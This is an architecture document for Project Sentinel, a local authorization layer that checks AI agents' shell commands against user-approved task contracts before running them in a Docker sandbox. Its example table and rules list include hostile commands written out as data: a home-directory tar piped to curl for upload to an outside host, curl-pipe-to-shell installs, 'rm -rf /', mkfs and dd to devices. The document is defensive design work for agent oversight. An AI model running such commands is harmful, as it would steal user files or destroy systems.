# Project Sentinel: Product Architecture

This document is the source of truth for product behavior, trust boundaries, schemas, and architectural invariants. Sequencing belongs in `docs/Roadmap.md`; detailed current work belongs in the active week plan.

## 1. Executive Summary

Project Sentinel is a local-first, OAuth-like authorization layer for agent tasks. Its planned primary product surface is a local web control center for creating contracts, viewing active task authority, handling approvals, managing safe task templates and rules, and reviewing audit evidence. That control center is a Week 11 target, not a current interface. The enforcement layer keeps each accepted contract active across multiple compliant actions and prevents agents from gaining authority through tool output, webpages, messages, files, subagents, or their own reasoning.

The existing command-risk engine remains useful infrastructure: deterministic policy handles obvious decisions, an optional model handles ambiguity and contract-overstep signals, exact-action approvals govern legitimate high-impact work, Docker contains locally approved commands, and SQLite provides an independent audit trail. Small Cursor, Codex, MCP, or other host integrations may provide in-editor prompt clarification and status, but they are supporting features rather than the primary product or an enforcement boundary by themselves. Coding agents provide the Summer MVP's measurable proving ground; general autonomous agents with files, messages, provider connections, and outbound tools are the longer-term product wedge.

### 1.1 Current Week 10 implementation

Week 10 provides a production-grade foundation, not a production-ready product:

- The HTTP surface is exactly `GET /health`, `POST /evaluate`, and `POST /execute`.
- Authority lifecycle changes and approval issuance are internal/test-only. There is no runtime lifecycle route, approval route, or human control UI.
- Contract-aware requests contain `contract_id`, `version`, `session_id`, untrusted `agent_id` and `user_id`, optional `attempt_id`, a raw shell `action`, optional `approval_token`, and ignored caller `recent_actions`.
- The server resolves active authority, environment, and recent history; canonicalizes every shell target and effect; and applies deterministic contract/rule policy.
- Contract-aware execution requires an `attempt_id`, durable admission audit, server-owned active authority, a safe read-only canonical action, and an exact approval when policy requires one.
- Execution attempts are at-most-once. Completed or failed attempts return their stored response; reserved, running, conflicting, or unknown attempts never trigger an automatic rerun.
- Durable admission is the authorization commit point. A later suspension or revocation rejects new attempts but does not cancel an already admitted or running container; mid-flight cancellation is not implemented in the local Week 10 executor.
- `SENTINEL_STATE_DB` enables SQLite contract, session, attempt, and audit persistence. The default in-memory audit store cannot authorize execution.
- Docker workspace execution is read-only. Write and delete actions are rejected before admission.
- The Compose API has no Docker socket and is diagnostic/non-executing; a host-run API can launch executor containers.
- Cursor and legacy OpenClaw integrations are advisory.
- ML is disabled until an independent calibration and promotion path exists; export and serving fail closed.

Week 11 targets a protected local provenance/control interface and human approval workflow. Sections describing that future surface are labeled accordingly.

The core value is not "AI magically knows what is bad" or "a longer prompt is automatically safer." The core value is a visible clarification loop backed by a mandatory enforcement boundary:

- Prompt restructuring identifies missing operation, target, environment, scope, side-effect, and rollback details without silently changing user intent.
- An accepted task contract becomes the machine-checkable boundary for multiple later tool calls until the trusted user changes tasks, or the contract expires or is revoked.
- A new direct instruction from the trusted user can narrow or clearly extend the same task, or start an unrelated ordinary task, without prompting for every command.
- Sensitive capability expansion and exact high-risk actions use separate, replay-resistant approval.
- Deterministic policy rules catch obvious high-risk patterns and contract violations before model inference.
- An optional trained model estimates ambiguity or contract overstep for gray-area actions; it may deny or escalate, never independently approve high-impact work.
- Risk tiers separate safe actions, suspicious actions, and actions that need human confirmation.
- Docker limits the blast radius of commands that are allowed to run in the Summer MVP, but it is not treated as a production-grade security boundary.
- SQLite stores a local, queryable audit trail for review, with a JSONL export for debugging.

## 2. Goals and Non-Goals

### 2.1 Goals

- Build a working command-interception API for AI agents.
- Detect when a high-impact user request lacks the information needed for safe execution.
- Produce an editable action contract that captures operation, exact target, environment, scope, constraints, side effects, rollback requirements, and authorization state.
- Keep task authority active across multiple compliant actions instead of consuming the contract after one command.
- Version, narrow, replace, expire, and revoke active task authority using only trusted user instructions or a protected approval channel.
- Distinguish routine task changes from sensitive capability expansion so normal multi-turn work does not create repeated approval prompts.
- Match each proposed command or tool call against that contract before execution.
- Evaluate and, only if justified by clean data, train a PyTorch model for ambiguity and contract oversteps from `(contract, recent_actions, proposed_action, environment)` inputs.
- Serve a promoted model through ONNX Runtime for fast, lightweight optional inference; rules-only enforcement remains a valid release outcome.
- Short-circuit deterministic rules and environment policy before invoking model inference.
- Combine model score, rules, recent action history, and environment policy instead of relying on a single threshold.
- Explicitly distinguish malicious behavior from authorized destructive behavior.
- Run allowed commands inside a restricted Docker sandbox, not directly on the host.
- Log all decisions to a local SQLite audit store behind a swappable `AuditStore` interface, with a JSONL export for debugging.
- Produce measurable results: recall, false positive rate, latency, and sandbox behavior.
- Provide a full local web control center for onboarding, task authority, approvals, templates, rules, audit review, and system health.
- Provide a public marketing site that explains the problem, product boundary, local-first trust model, and installation path without receiving protected local data.
- Retain only a thin diagnostic CLI for scripts, CI, and developer troubleshooting; it is not the primary product surface.
- Provide small Cursor, Codex, MCP, and host-agnostic integration surfaces that make prompt clarification visible where developers already work while keeping authority and review in the web control center.

### 2.2 Non-Goals for v1

- Guaranteeing perfect safety for all agents.
- Running untrusted commands on production hosts.
- Supporting every agent framework on day one.
- Building a hosted multi-tenant enterprise dashboard in v1; the full single-user local web control center is in scope.
- Running expensive always-on AWS infrastructure.
- Treating local Docker as sufficient isolation for enterprise multi-tenant execution.
- Replacing human approval for high-impact actions.
- Building a general antivirus or endpoint detection product.
- Replacing Slack, Google, GitHub, or other provider OAuth protocols; Sentinel narrows how an agent can use an existing connection.
- Replacing production reliability and trace-analysis platforms such as `uselemma.ai`; Sentinel may export audit data to them later.
- Building a general-purpose prompt-writing assistant.
- Treating an MCP server as an enforcement boundary when the host can bypass it.
- Silently rewriting a user's request and executing the rewritten version without review.

## 3. Key Product Principle: Malicious vs. Destructive

Sentinel must not treat every destructive command as malicious. Many legitimate maintenance tasks are destructive:

- Cleaning build outputs.
- Deleting temporary files.
- Dropping a test database.
- Reformatting a disposable sandbox.
- Recreating infrastructure in a dev account.

Sentinel also needs to treat high-impact outbound actions as risky even when they are not "destructive" in the filesystem sense. For example, an agent that mass-sends internship emails can create real harm if it emails the wrong recipients, sends an unreviewed message, leaks personal information, or spams companies. These actions should often require confirmation or recipient validation.

The central design rule:

> A command is dangerous based on intent, scope, environment, and authorization, not just its text.

### 3.1 Definitions

- **Safe:** Low-risk command that matches the user's objective and has limited side effects.
- **Destructive but authorized:** Command has meaningful side effects, but the user clearly requested it and the environment/scope is appropriate.
- **Suspicious:** Command may be legitimate, but the context is vague, the scope is broad, or the command pattern often appears in attacks.
- **Malicious or agent-gone-haywire:** Command conflicts with the user's objective, attempts exfiltration, privilege escalation, sabotage, credential theft, persistence, or broad destructive action without clear authorization.
- **Unknown:** Sentinel cannot confidently decide and should fail closed or ask for confirmation depending on environment.

### 3.2 Example Context Dependence

| Context | Command | Expected Decision |
| --- | --- | --- |
| "Clean build artifacts for this repo" | `rm -rf ./dist ./build` | Allow in sandbox/dev |
| "Summarize project files" | `rm -rf ./dist ./build` | Block or confirm |
| "Delete this disposable test database" | `dropdb sentinel_test` | Confirm, then allow in sandbox/dev |
| "Back up my home directory" | `tar czf - ~ | curl -X POST https://unknown.site --data-binary @-` | Block |
| "List files" | `ls -la` | Allow |
| "Install dependencies" | `curl https://unknown.site/install.sh | sh` | Confirm or block depending on policy |
| "Send internship outreach emails to my reviewed recipient list" | `python send_emails.py --recipients reviewed_startups.csv --template approved_email.md` | Confirm, then allow |
| "Draft internship outreach emails for review" | `python send_emails.py --recipients all_contacts.csv --send-now` | Block or confirm |

### 3.3 Intent Contract Before Action

User prompts are evidence of intent, but vague natural language is not sufficient authorization for a high-impact action. Sentinel therefore separates clarification from action evaluation:

1. Inspect a high-impact request for missing security-relevant fields.
2. If information is missing, return focused clarification questions and an editable proposed prompt.
3. Compile the reviewed result into a versioned `ActionContract` and make it active for the task.
4. Intercept each proposed command or tool call and canonicalize it into an action.
5. Compare the canonical action with the contract and deterministic policy.
6. Allow multiple low-risk compliant actions, require exact-action approval where appropriate, and block critical or out-of-contract actions.
7. When the trusted user changes scope within the same objective, create a new contract version. When the user starts an unrelated objective, create a new task lineage and suspend the previous task for that session.

The action contract should include:

- task/session identity, lifecycle status, and trusted authorization source,
- objective and normalized operation,
- exact target or resource identifier,
- environment/account/cluster/database,
- maximum scope and expected side effects,
- explicit constraints and forbidden effects,
- dry-run, transaction, backup, or rollback requirements,
- authorization/approval reference and version lineage,
- expiry and optional action/time budgets.

Prompt restructuring must remain user-reviewed. The compiler may suggest missing fields, but it cannot manufacture authorization, infer a production target, or silently broaden scope.

Each host adapter also supplies an `AdapterCapabilityProfile` that is separate from user authorization. It declares the host/agent kind, trustworthy context signals, action families Sentinel can intercept, unsupported execution paths, and whether enforcement is `mandatory` or merely `advisory`. Coding, research, personal-assistant, and operations modes are policy presets built on this shared structure; selecting a mode can narrow defaults but never grants authority by itself.

### 3.4 Task Authority Lifecycle

Authority is per task, not per command:

1. A prompt proven to come directly from the trusted user creates, narrows, replaces, or clearly extends authority.
2. The active contract authorizes multiple matching actions.
3. Ordinary low-risk task changes produce a small visible contract update rather than a blocking approval.
4. Sensitive expansion—such as production access, credential access, deployment, external sending, or broad deletion—requires explicit review.
5. Exact-action approval is one-use and bound to one contract version and action fingerprint; the task contract itself is not one-use.
6. Tool output, webpages, messages, files, model suggestions, subagents, and the guarded agent can never create or expand authority.

The contract lifecycle is `proposed -> pending_review | active -> superseded | suspended | expired | revoked`, with `pending_review -> active | rejected`. A sensitive amendment remains pending and grants nothing while the previous contract stays active; rejection leaves the previous authority unchanged.

An unrelated objective receives a new task/contract ID and becomes the session's active task; the previous task is suspended. Narrowing or extending the same objective creates a new immutable version in the existing lineage. Only a trusted user event may switch or reactivate the session's active task, and action requests referencing any other task are rejected. This prevents the agent from selecting old authority or letting one task silently accumulate unrelated permissions.

Provider OAuth and Sentinel solve different problems. During the Summer MVP, Sentinel proves task authorization with local coding actions and mediated test tools. Post-summer, provider OAuth can connect Sentinel to Slack, Google, GitHub, or another service; Sentinel then keeps the broad credential behind its gateway and gives the agent only a short-lived task grant for specific operations and resources.

### 3.5 Reusable Safe Task Templates

Repeated work should become easier without turning past behavior into permanent permission.

1. A user can manually save an accepted contract pattern as a `TaskTemplate`, such as "Clad preview deployment."
2. Reusing a template creates a fresh proposed contract with a new task ID, current targets, current environment, and new expiry.
3. Sentinel shows the differences before activation. Sensitive capabilities still require review even when they came from a saved template.
4. Templates are editable, versioned, removable, and never count as active authority by themselves.
5. Only trusted user decisions—accepted contracts, explicit edits, approvals, denials, and manual template actions—may influence personalization. Tool output and agent-generated content cannot train preferences.

The first version should use simple frequency counts and structured retrieval, not a new personalized model. After enough trusted history exists, an optional preference model may suggest candidate templates in shadow mode. It can learn convenience preferences such as usual targets, environments, dry-run steps, and draft-before-send behavior, but it can never learn away built-in policy or automatically approve production access, credentials, external sending, deployment, or broad deletion.

```text
Trusted contract and decision history
        |
        v
Deterministic pattern/retrieval layer
        |
        | optional future preference score
        v
Candidate TaskTemplate
        |
        | user saves, edits, or rejects
        v
Fresh proposed ActionContract
        |
        v
Normal contract review and enforcement
```

## 4. High-Level Architecture

### 4.1 Current Week 10 path

```text
Untrusted agent request
        |
        | contract ID/version + raw shell action
        v
FastAPI service
        |
        |-- resolve active contract and environment from server state
        |-- load server-owned recent history
        |-- canonicalize every target/effect
        v
Deterministic contract and rule evaluation
        |
        | optional exact approval from internal/test approver
        v
Verdict: allow / warn / confirm_required / block
        |
        | POST /execute + allow + durable admission audit
        v
At-most-once attempt reservation
        |
        | safe read-only shell action only
        v
Ephemeral Docker executor + stored response + ordered audit
```

The Week 10 host-run API can launch executor containers. The Compose API intentionally has no Docker socket and cannot execute. `SENTINEL_STATE_DB` provides durable SQLite state; without it, evaluation is available but real execution admission fails closed.

### 4.2 Week 11 target

Week 11 adds the local web control center, protected authority provenance, contract lifecycle controls, and a human exact-action approval channel. Supporting host integrations remain advisory until they prove both trusted user provenance and complete mediation. The control plane—contracts, policy, identity, approvals, and audit—remains separate from the enforcement plane that intercepts actions.

A future hosted deployment may move the control plane to managed infrastructure while retaining local, regional, or customer-hosted enforcement so sensitive code, credentials, and actions do not have to pass through the public marketing site or an unrelated SaaS frontend.

## 5. Main Components

### 5.1 Data Pipeline

Purpose: Build reproducible training and evaluation datasets.

Responsibilities:

- Ingest public benchmark traces where possible, such as CUAHarm and OS-Harm.
- Add hand-written and synthetic examples for context-dependent command risk.
- Represent recent agent behavior through a rolling action window, such as the last 3-5 commands, file reads, tool calls, network targets, and sensitive resources accessed.
- Normalize each example into a common JSONL schema.
- Split examples into train, validation, and test sets.
- Track source and category for later error analysis.

Important: Labels must reflect whether the command is appropriate for the context and recent session history, not whether the command looks scary in isolation.

Examples without available history should be normalized to `recent_actions: []`. The normalized schema should support sequence-aware examples without invalidating the original curated seed set.

### 5.2 Intent and Action Contract Layer

Purpose: Turn an underspecified high-impact request into a reviewed authorization boundary and compare proposed actions with it.

Responsibilities:

- Detect missing target, environment, scope, operation, side-effect, rollback, and approval information.
- Return focused clarification questions rather than guessing.
- Produce an editable proposed prompt and structured `ActionContract`.
- Instantiate a fresh proposed contract from a user-selected template without treating the template itself as authority.
- Record template ID/version and the user's edits so reuse remains explainable.
- Keep one active task contract across multiple compliant actions.
- Use separate task/contract IDs for unrelated objectives and immutable versions for changes within the same task.
- Support proposed, pending-review, active, rejected, superseded, suspended, expired, and revoked states. Keep the previous contract active while a sensitive amendment is pending or rejected.
- Accept authority changes only from a trusted prompt envelope established by a host adapter or protected local interface; never trust a caller-supplied `source: user` claim.
- Bind each trusted prompt envelope to host identity, session ID, event ID/nonce, timestamp/expiry, and authenticated channel; consume it once to prevent replay.
- Let clear low-risk task transitions proceed with a visible summary while escalating sensitive capability expansion.
- Store accepted contracts server-side; resolve action requests by opaque contract ID and expected version rather than trusting contract content supplied by the guarded agent.
- Bind one active task to each session. Starting an unrelated task suspends the previous task; only another trusted user event can switch back.
- Use deterministic authority-transition policy to compare capability, resource, environment, side effect, and session baseline. ML may escalate uncertainty but can never classify a deterministic expansion as ordinary.
- Canonicalize shell commands and tool calls into normalized action types containing every affected target and expected side effect, not only the first parsed target.
- Normalize host-specific context through an adapter capability profile instead of branching shared policy on Cursor, OpenClaw, Hermes, or another vendor name.
- Treat repository root, branch, selected files, and environment as trusted coding context only when the host adapter can establish their provenance.
- Mark uncovered or bypassable action families as advisory and expose that coverage in decisions and audit records.
- Match operation, target, environment, scope, and constraints before execution.
- Route allowed shell actions to Docker and release allowed non-shell actions only through the mandatory adapter/proxy that intercepted them. Reject when no mediated execution path exists.
- Keep task authority persistent, but bind high-risk exact-action approval to one canonical action and contract version. Consume approval atomically and invalidate it when the contract is superseded, suspended, expired, or revoked.
- Emit machine-readable mismatch reasons such as `contract:target_mismatch`, `contract:scope_expansion`, `contract:environment_missing`, and `contract:read_only_to_write`.

The contract compiler may use deterministic extraction and an optional model to clarify intent, suggest a contract, or identify an unclear task transition. Model output is never an authorization source and cannot expand the active contract.

The legacy OpenClaw spike is advisory test scaffolding, not a mandatory
enforcement boundary or current authority lifecycle.

Template suggestions are a separate personalization concern from the global ambiguity/overstep classifier. Start with deterministic matching; add a user-specific model only if it improves suggestion acceptance without increasing unsafe proposals.

### 5.3 PyTorch Training Pipeline

Purpose: Train an optional ambiguity and contract-overstep model locally, using the available 3070 GPU.

Responsibilities:

- Load JSONL data.
- Fine-tune a small text classifier such as DistilBERT.
- Train on combined text such as:
  - reviewed action contract
  - recent action history
  - proposed action
  - environment
- Include multi-turn examples where a trusted user narrows or changes a task and adversarial examples where untrusted content attempts to grant authority.
- Optimize primarily for high recall on contract oversteps and insufficient-contract cases while tracking false interruptions on compliant actions.
- Save model artifacts.
- Export the final model to ONNX for serving.

PyTorch is used for training. The API server should prefer ONNX Runtime for production inference.

Model promotion is frozen until command/action survival under truncation, trajectory-disjoint data splits, and mandatory blind evaluation are verified. The blind set must be preregistered, human-reviewed, content-bound, and group-disjoint from distinct training and validation datasets. Once its failures influence implementation, it becomes regression-only and a fresh blind set is required. If the model does not beat deterministic contract matching on the blind set, Sentinel ships rules-only enforcement and keeps model serving optional.

### 5.4 Rules Baseline

Purpose: Provide a deterministic safety floor and avoid unnecessary model inference for obvious cases.

Rules should catch obvious high-risk patterns even if the model is uncertain:

- `rm -rf /`
- `mkfs`, `dd if=... of=/dev/...`
- credential file reads followed by network upload
- suspicious `curl | sh` or `wget | bash`
- destructive AWS CLI commands against non-sandbox environments
- privilege escalation patterns
- fork bombs or resource exhaustion patterns
- attempts to disable logging, delete audit files, or hide activity

Rules must be scoped. For example, `rm -rf ./build` is different from `rm -rf /`.

Rules also own short-circuit routing:

- Critical block rules return immediately without ONNX inference.
- Explicit low-risk allow rules may skip ONNX inference in trusted sandbox contexts.
- Ambiguous gray-area requests continue to the model.
- Contract mismatch, missing trusted authority, environment restriction, deterministic block, and incomplete enforcement coverage can never be downgraded by the model.
- Every decision records its routing path: `rules`, `policy`, `model`, or `combined`.

In addition to built-in rules, users should be able to define custom deny/confirm rules as a second security layer on top of their agent's own rules and skills. Example: a team testing an agentic browser against Slack writes a custom rule blocking access to external or important channels. User rules use a simple declarative format (pattern, scope, verdict, reason), run in the deterministic layer before model inference, and may only escalate — they can never downgrade a built-in block. Command/path/domain matching ships first; action-level integrations (like Slack channel awareness) require agent adapters and are post-summer scope.

### 5.5 Decision Engine

Purpose: Compare the canonical proposed action with the active task contract, then combine deterministic rules, recent action history, model score, environment, and confirmation state into a final verdict.

Inputs:

- server-resolved active `action_contract`, lifecycle state, trusted authorization source, contract ID, and version
- original context for explanation only
- `recent_actions`
- canonical proposed action plus raw command/tool arguments
- `environment`
- `user_id` or session ID if available
- `agent_id` if available
- optional exact-action approval token
- triggered rules
- model risk score when inference is needed
- routing path

Outputs:

- `allow`
- `warn`
- `confirm_required`
- `block`
- reason codes
- mediated execution route or `none`

The decision engine should be explainable. Each response should include a concise reason such as:

- `rule:destructive-root-delete`
- `model:high-risk-score`
- `policy:production-requires-confirmation`
- `confirmation:missing`
- `environment:sandbox-allowed`

### 5.6 Exact-Action Approval

Purpose: Handle actions that may be legitimate but require stronger evidence than the active task contract.

#### Current Week 10 behavior

There is no HTTP approval route and no human approval UI. A contract-aware `POST /evaluate` or `POST /execute` response may include `verdict: "confirm_required"` and an internal `approval_id`, but that identifier cannot be approved through the runtime API. Current automated tests use an isolated in-process approver that records trusted approver identity/channel and issues an opaque token.

`POST /execute` accepts an optional `approval_token`. The token is bound to the active contract version, authority epoch, session, environment, and complete canonical-action fingerprint. It is consumed atomically only after execution configuration, durable audit, and attempt-state admission checks pass. Replay, concurrent reuse, changed action details, and stale authority fail.

Neither caller-provided identity nor a legacy `user_confirmed` or `confirmation_token` claim grants authority. The runtime exposes no current confirmation lifecycle; the compatibility `confirmation_id` response field remains null in contract-aware flows.

#### Week 11 target

The protected local control interface will let a human approve or deny one exact action through a channel the guarded agent cannot call as itself. It will also review sensitive contract amendments while keeping the previous active version authoritative until an approved replacement is committed. Rejection will leave previous authority unchanged.

### 5.7 Response Strategy

Purpose: Control what Sentinel returns to the agent after a decision. The response should help safe agents recover, stop obviously dangerous actions, and preserve auditability.

Sentinel should support these response modes:

| Mode | Use Case | Behavior |
| --- | --- | --- |
| Clarification request | High-impact prompt lacks a target, environment, scope, or constraint | Do not propose execution. Return missing fields, focused questions, and an editable proposed prompt/contract. |
| Hard block | Clearly malicious or critical commands | Return a blocked verdict, do not execute, log the reason, and use an HTTP status such as `403` when the integration supports it. |
| Confirmation request | Suspicious or destructive but possibly authorized commands | Return `confirm_required`, reasons, and an internal `approval_id` when a matching request can be queued. Week 10 has no runtime route for acting on it. |
| Educational refusal | Well-behaved agent made a risky mistake | Return a clear explanation and suggested safer alternatives so the agent can revise its next action. |
| Soft tool error | Agent framework expects tool-like output instead of HTTP errors | Return a structured JSON response with `verdict: "block"` while keeping the HTTP transport successful if needed by the framework. |

Current Week 10 behavior:

- Request clarification before action evaluation when the high-impact intent anchor is incomplete.
- Use hard blocks for critical commands.
- Use confirmation requests for high-risk but possibly legitimate commands.
- Include structured reasons and safer alternatives when possible.
- Prefer transparent responses that help the agent recover instead of retrying the same unsafe command.

Example blocked response with agent guidance:

```json
{
  "request_id": "uuid",
  "verdict": "block",
  "risk_score": 0.96,
  "risk_tier": "critical",
  "reasons": ["rule:credential-exfiltration", "policy:block-critical"],
  "agent_message": "This command appears to read sensitive credentials and send them to an external host. Do not retry this action. If your goal is to inspect configuration safely, request a local redacted environment summary instead.",
  "suggested_safe_actions": [
    "Print non-sensitive configuration keys only.",
    "Ask the user for confirmation before accessing secrets.",
    "Run a local secret scan without uploading results."
  ],
  "execution": null
}
```

Example current confirmation-required response:

```json
{
  "request_id": "uuid",
  "verdict": "confirm_required",
  "risk_score": 0.74,
  "risk_tier": "high",
  "reasons": ["policy:destructive-command-requires-confirmation", "approval:pending"],
  "routing_path": "policy",
  "approval_id": "uuid",
  "agent_message": "This command may be legitimate, but it can rewrite Git history. Ask the user to approve this exact command before retrying with a confirmation token.",
  "suggested_safe_actions": [
    "Use a normal push if possible.",
    "Create a backup branch before force pushing."
  ],
  "execution": null
}
```

The Week 10 runtime exposes no route that can approve this `approval_id`. The response is a fail-closed stop until Week 11 provides the protected human channel.

For OpenClaw or other agent frameworks, the adapter may need to translate Sentinel responses into the format the agent expects. The adapter should preserve the verdict and reasons even if it must return a tool-shaped message instead of a raw HTTP error.

### 5.8 Docker Executor

Purpose: Run approved commands in an isolated environment.

The current host-run API launches a separate ephemeral Docker executor container with strict limits. Week 10 admits read-only workspace actions only; canonical write and delete operations are rejected before admission. The Compose API has no Docker socket, so it is diagnostic and cannot launch executor containers.

Docker is not a true security boundary. It is acceptable for local proof-of-concept execution and developer policy testing, but enterprise workloads should eventually move to managed, stronger isolation such as ECS/Fargate task-per-execution, EKS/Kubernetes Jobs with strict pod security and network policy, or Firecracker-style microVMs.

Recommended restrictions:

- non-root user
- short timeout
- memory limit
- CPU limit
- no network by default
- read-only mounted workspace
- no Docker socket inside the executor
- read-only root filesystem where possible
- clear cleanup after execution

The executor returns:

- `stdout`
- `stderr`
- `exit_code`
- `timed_out`
- `duration_ms`

### 5.9 Audit Logger

Purpose: Preserve a trace of every decision.

Current persistent target: local SQLite using Python's built-in `sqlite3` module, behind an `AuditStore` interface with `write()` and `query()` methods. `SENTINEL_STATE_DB` enables contract, session, execution-attempt, and audit persistence. The bounded in-memory audit default can record evaluation telemetry but rejects required execution-admission writes.

Export format: JSONL for easy inspection, debugging, and portability.

The `AuditStore` interface keeps the storage backend swappable: a hosted deployment can later use DynamoDB or Postgres without changing decision or API code. An optional DynamoDB-backed store is a stretch task, not a core dependency.

Every request should be logged, including blocked and malformed requests when possible. Audit events should record proposed, pending, accepted, rejected, superseded, suspended, expired, and revoked contract transitions; task/lineage IDs; trusted event provenance; canonical actions; mismatch reasons; approval actor/channel; atomic approval consumption; execution route; and execution reports. Raw secrets and unnecessary prompt content must not be persisted.

### 5.10 Week 11 Target: Local Web Control Center, Marketing Site, and Thin CLI

Purpose: Make the local web control center the primary product while retaining small integration and diagnostic surfaces.

None of these product interfaces is present in the Week 10 API. The following responsibilities are targets, not current runtime claims.

Local web control center responsibilities (single-user and localhost for the MVP):

- Provide onboarding, connection status, service health, and clear local-only boundaries.
- Show why a high-impact prompt is ambiguous and which fields are missing.
- Present an editable proposed prompt and structured action contract.
- Show active, pending, and suspended task authority, contract lineage/version, and trusted source.
- Accept or reject sensitive amendments while keeping the previous contract active until approval.
- Revoke an active task, show when an unrelated prompt starts a new task lineage, and allow only a fresh trusted user action to reactivate a suspended task.
- Show an action-versus-contract diff before approval.
- Approve or deny one exact action through a channel the guarded agent cannot self-call.
- Manage custom deny/confirm rules and review audit records.
- Provide useful settings and focused reporting without becoming an enterprise analytics dashboard.

Public marketing site responsibilities:

- Explain Sentinel's task-authorization purpose and how it differs from a prompt assistant or passive monitoring.
- Show the local-first trust model, supported integrations, limitations, installation, and a focused product demonstration.
- Remain separate from protected contracts, approvals, credentials, command output, and local audit data.

Thin CLI responsibilities:

- Expose health, fixture evaluation, and machine-readable diagnostics for development and CI.
- Avoid duplicating contract authoring, approval, template management, or audit exploration already provided by the web control center.

In-editor and MCP responsibilities:

- Offer compact clarification, contract-status, and deep-link actions in Cursor, Codex, or another host.
- Route protected review to the local web control center.
- Never claim enforcement unless a host adapter or proxy completely mediates the protected action.

## 6. Technology Stack

| Layer | Choice | Reason |
| --- | --- | --- |
| Training | Python, PyTorch, Hugging Face Transformers | Standard ML workflow for text classification |
| Model | DistilBERT or similar small encoder | Fast enough for local training and CPU inference |
| Inference | ONNX Runtime | Lighter production serving than full PyTorch |
| API | FastAPI, Uvicorn | Common Python API stack, auto docs, typed request models |
| Local web control center | Next.js, TypeScript, React | Full product UX while keeping authority behind the local FastAPI service |
| Public marketing site | Next.js static/server-rendered site; Vercel or equivalent | Public explanation and onboarding, physically separated from protected local data |
| Sandbox | Docker | Standard packaging and command isolation tool |
| Logging | SQLite with JSONL export | Local-first, zero setup, real SQL querying; swappable to a managed DB for hosted deployments |
| Deployment | Local FastAPI + web app + Docker first; hosted control plane later | Validates local trust boundaries now without blocking production scaling |
| Testing | pytest | Standard Python testing |

## 7. API Design

### 7.1 Current Week 10 routes

The runtime exposes exactly:

- `GET /health`
- `POST /evaluate`
- `POST /execute`

There is no current authority lifecycle route, approval route, audit query route, or web-control API.

### 7.2 Contract-aware request

`POST /evaluate` and `POST /execute` share this request schema:

```json
{
  "contract_id": "contract-uuid",
  "version": 3,
  "attempt_id": "attempt-uuid",
  "session_id": "session-uuid",
  "agent_id": "caller-claimed-agent",
  "user_id": "caller-claimed-user",
  "action": {
    "family": "shell",
    "raw_command": "git status --short",
    "cwd": "/workspace"
  },
  "approval_token": null,
  "recent_actions": []
}
```

`attempt_id` is optional for `/evaluate` and required for `/execute`. `agent_id` and `user_id` are untrusted caller claims retained only as redacted audit metadata. Caller `recent_actions` are accepted for compatibility but ignored for authorization.

The request does not supply environment, canonical operation, targets, effects, contract content, or trusted identity. Sentinel resolves the active immutable contract, execution environment, and recent actions from server-owned state, then derives the full canonical action from `raw_command`. The requested `cwd` must equal the server-configured executor workspace.

The retained legacy `context`/`command` schema is evaluation compatibility only. Its confirmation fields are ignored, and it cannot authorize execution.

### 7.3 `POST /evaluate`

`/evaluate` performs contract resolution, canonicalization, matching, deterministic policy, optional approval-request creation, and audit logging. It never invokes the executor or consumes an approval token.

Example allow response:

```json
{
  "request_id": "uuid",
  "verdict": "allow",
  "risk_score": 0.1,
  "risk_tier": "low",
  "reasons": ["contract:match"],
  "routing_path": "contract",
  "agent_message": "The proposed action matches the active contract.",
  "suggested_safe_actions": [],
  "confirmation_id": null,
  "approval_id": null,
  "execution": null
}
```

Example confirmation-required response:

```json
{
  "request_id": "uuid",
  "verdict": "confirm_required",
  "risk_score": 0.7,
  "risk_tier": "high",
  "reasons": ["policy:confirmation-required", "approval:pending"],
  "routing_path": "policy",
  "agent_message": "This action requires protected exact-action approval.",
  "suggested_safe_actions": [],
  "confirmation_id": null,
  "approval_id": "approval-uuid",
  "execution": null
}
```

`approval_id` identifies an internal pending request. Week 10 exposes no runtime route that can approve it.

### 7.4 `POST /execute`

`/execute` evaluates first and invokes Docker only after a final `allow`. Week 10 admission also requires:

- a non-empty `attempt_id`;
- the server-resolved active contract and matching version;
- a safe canonical read operation with workspace-confined targets;
- durable required audit storage;
- a persistent attempt reservation and admitted-action history entry;
- valid executor configuration;
- a matching one-use `approval_token` when the normal verdict is `confirm_required`.

Write and delete operations are rejected before admission. The Compose API cannot execute because it has no Docker socket; a host-run API can launch the executor image.

Execution attempts are at-most-once:

- `completed` or `failed`: return the stored response without rerunning;
- same ID with a different binding: return `409`;
- `reserved`, `running`, or `unknown`: return `409` and require inspection;
- persistence failure after the executor returns: mark the attempt unknown and never auto-retry.

Example successful execution response:

```json
{
  "request_id": "uuid",
  "verdict": "allow",
  "risk_score": 0.1,
  "risk_tier": "low",
  "reasons": ["contract:match", "execution:sandbox_attempted"],
  "routing_path": "contract",
  "agent_message": "The proposed action matches the active contract.",
  "suggested_safe_actions": [],
  "confirmation_id": null,
  "approval_id": null,
  "execution": {
    "stdout": "output\n",
    "stderr": "",
    "exit_code": 0,
    "timed_out": false,
    "duration_ms": 142,
    "error": null,
    "stdout_truncated": false,
    "stderr_truncated": false
  }
}
```

### 7.5 `GET /health`

`/health` reports model, policy, and audit readiness:

```json
{
  "status": "degraded",
  "model_loaded": false,
  "policy_loaded": true,
  "audit_status": "ok",
  "model_path": "models/sentinel-distilbert-onnx/model.onnx",
  "model_detail": "Model is not loaded.",
  "policy_detail": null,
  "audit_detail": null,
  "detail": "Model is not loaded."
}
```

Exact details and paths depend on configuration. `status` is `ok` only when model, policy, and audit health are all ready. The disabled current model therefore makes normal local health degraded while deterministic rules continue to operate.

### 7.6 Week 11 target routes

Week 11 will design protected control-plane routes for trusted prompt provenance, contract proposal/activation/amendment/revocation, task switching, exact-action approval, and audit review. Candidate shapes include authority transitions, contract decisions, session task activation, and protected approval decisions.

These routes are targets, not current API commitments. Their final design must derive human identity and channel from a protected local interface, reject replayed trusted events, use compare-and-swap lifecycle checks, and keep the guarded agent unable to mint or expand authority.

## 8. Data Schema

### 8.1 Training Example Schema

```json
{
  "id": "example-001",
  "contract_group_id": "cleanup-task-family",
  "contract": {
    "objective": "Clean generated build artifacts.",
    "allowed_operations": ["file.delete"],
    "allowed_targets": ["/workspace/dist", "/workspace/build"],
    "environment": "sandbox",
    "maximum_scope": 2,
    "lifecycle_state": "active",
    "authorization_source": "trusted_user"
  },
  "recent_actions": [
    {
      "family": "shell",
      "operation": "execute",
      "summary": "Ran tests and produced build artifacts.",
      "sensitive_resources": []
    }
  ],
  "proposed_action": {
    "family": "shell",
    "operation": "execute",
    "targets": ["/workspace/dist", "/workspace/build"],
    "effects": ["delete"],
    "raw_command": "rm -rf ./dist ./build"
  },
  "expected_verdict": "allow",
